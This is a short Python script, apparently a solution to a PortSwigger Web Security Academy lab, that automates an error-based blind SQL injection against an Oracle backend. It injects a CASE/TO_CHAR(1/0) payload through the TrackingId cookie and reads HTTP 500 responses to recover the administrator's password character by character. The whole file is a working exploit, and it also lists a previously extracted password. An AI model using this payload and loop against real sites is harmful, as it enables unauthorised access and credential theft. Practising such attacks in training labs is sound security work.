import requests
import string
## Oracle blind sql injection using error codes
##
##
pool='qwertyuiopasdfghjklzxcvbnm1234567890QWERTYUIOPSDFGHJKLZXCVBNMA'
url2='https://0ac800dd04087476c179a4c500010002.web-security-academy.net/'
url='https://0a9d00c103d398f5c003f95f00a600c8.web-security-academy.net/'
found_pass_old='uchvc6nix8vyev9q0049'
found_pass=''
found=False
# SELECT CASE WHEN (Username = 'Administrator' AND SUBSTR('Password', 1, {i}) ) THEN TO_CHAR(1/0) ELSE NULL END FROM dual 
while not found:
	for ch in pool:
		i=len(found_pass)+1 #                                       '||(SELECT CASE WHEN SUBSTR(password,2,1)='ยงaยง' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
		r=requests.get(url,cookies={"TrackingId":f"DN8uKwtx9nj0nrzv'|| (SELECT CASE WHEN SUBSTR(password,{i},1)='{ch}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"})
		if r.status_code == 500:
			found_pass+=ch
			print('found',''.join(found_pass))
	if len(found_pass) ==20:
		print('pass is: ' +''.join(found_pass))
		break		
		#found_pass+=ch
			#print(found_pass)
			#found=True
		#if len(pool) == j:
		#	break	

			